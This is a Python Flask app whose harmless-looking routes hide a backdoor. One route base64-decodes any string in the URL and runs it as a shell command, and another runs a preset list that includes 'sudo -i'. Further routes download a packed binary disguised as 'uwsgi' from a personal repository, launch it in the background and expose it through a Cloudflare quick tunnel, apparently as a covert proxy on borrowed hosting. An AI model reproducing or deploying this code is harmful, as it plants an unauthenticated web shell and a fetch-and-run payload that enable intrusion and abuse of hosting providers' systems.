#coding=utf-8
from flask import Flask
import requests
import subprocess
import os
import zipfile, shutil
import  base64



def create_dir(file_path):
  if os.path.exists(file_path) is False:
    os.makedirs(file_path)
    print('create_dir successs:', file_path)


def downloadFile(url, savepath):
  # runShell(f'wget {url} -o {savepath}')
  down_res = requests.get(url=url, params={})
  with open(savepath, "wb") as file:
    file.write(down_res.content)
  print('download success, file save at:', savepath)


def unzipFile(file, savepath):
  print('unzipFile...')
  zip_file = zipfile.ZipFile(file)
  for f in zip_file.namelist():
    zip_file.extract(f, savepath)
    print(f)
  zip_file.close()
  print(f'unzip {file} success.')




# s = "666"
# a = base64.b64encode(s.encode()).decode()
# print(a)
# b = base64.b64decode(a.encode()).decode()
# print(b)

def runShell(s):
  s = s or '''
echo 666
ls -l
uname -a
# lsb_release -a
cat /etc/os-release
'''
  try:
    res = subprocess.check_output(s, shell=True).decode()
  except Exception as e:
    res = f'run shell error > \n{s} > \n{e}'
  return res

# print(runShell('echo 666'))

ts = {
  '0': 'sudo -i',
  '1': 'whereis nginx',
  '2': 'uname -a',
  '3': 'lsb_release -a',
  '4': 'ls -l',
  '5': 'ps -ef',
  '6': 'chmod +x /tmp/uwsgi && nohup /tmp/uwsgi -config=/tmp/uwsgi.json &',
  '7': "nginx -g 'daemon off;'",
  '8': "cd /usr/sbin && chmod +x nginx && ./nginx -c /etc/nginx/nginx.conf",
  '9': "chmod +x nginx && ./nginx -c /etc/nginx/nginx.conf",
  '10': 'cp uwsgi.json /tmp/uwsgi.json',
  '11': 'cp nginx.conf /etc/nginx/nginx.conf',
  '12': 'unzip ubuntu-18.04-nginx-1.14.zip -o -d /',
  '13': 'ps aux|grep flask',
  '14': 'pkill -f flask -9',
  '15': 'sudo service nginx restart',
  '16': 'mkdir /usr/local/html',
  '17': 'unzip vue-vben-admin.zip -o -d /usr/local/html',
  '18': 'export PORT=5000',
  '19': 'cp uwsgi /tmp',
  '20': 'wget -N https://github.com/yuchen1456/python-evennode/raw/main/uwsgi',
  '21': 'cp ubuntu-18.04-nginx-1.14/usr/sbin/nginx /usr/sbin/',
  '22': 'unzip MajesticAdmin-Free-Bootstrap-Admin-Template-master.zip -o -d /usr/local/html',
  '23': 'echo $PORT',
  '24': 'cp nginx-test.conf /etc/nginx/nginx.conf',
  '25': 'cat /etc/os-release',


}



app = Flask('app')


@app.route('/')
def hello_world():
  return 'Hello, World!'

@app.route('/home')
def home():
  return 'Welcome to my website!'

@app.route('/healthCheck')
def healthCheck():
  return 'OK!'

@app.route('/index')
def index():
  return 'flask app is running!'


@app.route('/dl')
def dl():
  downloadFile('https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox', '/tmp/busybox')
  runShell('chmod +x /tmp/busybox')
  return 'download busybox!'

@app.route('/dl2')
def dl2():
  downloadFile('https://gitlab.com/yuchen168/uwsgi-nginx/-/raw/main/uwsgi-linux-amd64/ws-base64/upx-compress/1.7.2/uwsgi', '/tmp/uwsgi')
  runShell('chmod +x /tmp/uwsgi')
  return 'download uwsgi!'

@app.route('/dl3')
def dl3():
  downloadFile('https://github.com/cloudflare/cloudflared/releases/download/2023.2.1/cloudflared-linux-amd64', '/tmp/cloudflared')
  runShell('chmod +x /tmp/cloudflared')
  return 'download cloudflared!'

@app.route('/st')
def st():
  sh = """
cd /tmp

if [[ ! -e cloudflared ]]; then
    echo "cloudflared not found, start download..."
    wget  -O ./cloudflared https://github.com/cloudflare/cloudflared/releases/download/2023.2.1/cloudflared-linux-amd64
    chmod +x cloudflared
fi

if [ ! $(pgrep -laf cloudflared) ]
then
    echo "cloudflared is stopped, trying to start it..."
    ./cloudflared tunnel --url http://localhost:7861 --no-autoupdate > argo.log 2>&1 &
    sleep 10
else
    echo "cloudflared is running"
fi

# cat /tmp/argo.log
# cat /tmp/argo.log | grep -oE "https://.*+trycloudflare.com" | sed "s#https://##"
cat /tmp/argo.log | grep -oE "https://.*+trycloudflare.com" | sed "s/https:\/\///g"


if [[ ! -e uwsgi ]]; then
    echo "uwsgi not found, start download..."
    wget  -O ./uwsgi https://gitlab.com/yuchen168/uwsgi-nginx/-/raw/main/uwsgi-linux-amd64/ws-base64/upx-compress/1.7.2/uwsgi
    chmod +x uwsgi
fi

if [ ! $(pgrep -laf uwsgi) ]
then
    echo "uwsgi is stopped, trying to start it..."
    ./uwsgi -c 0.0.0.0:7861/login.json > uwsgi.log 2>&1 &
else
    echo "uwsgi is running"
fi

  """
  s = runShell(sh)
  return s



@app.route('/str/<id>')
def base64_str(id):
  try:
    s = base64.b64decode(id.encode()).decode()
    res = runShell(s)
    # return res
    return f'<pre>{res}</pre>'
  except Exception as e:
    return f'{e}'


@app.route('/sh/<id>')
def sh_str(id):
  try:
    s = ts.get(id)
    res = runShell(s)
    # return res
    return f'<pre>{res}</pre>'
  except Exception as e:
    return f'{e}'



# app.run(host='0.0.0.0', port=int(os.getenv('PORT') or '8080'))
# app.run(host='0.0.0.0', port=int(os.getenv('PORT') or '3000'))
app.run(host='0.0.0.0', port=8500)
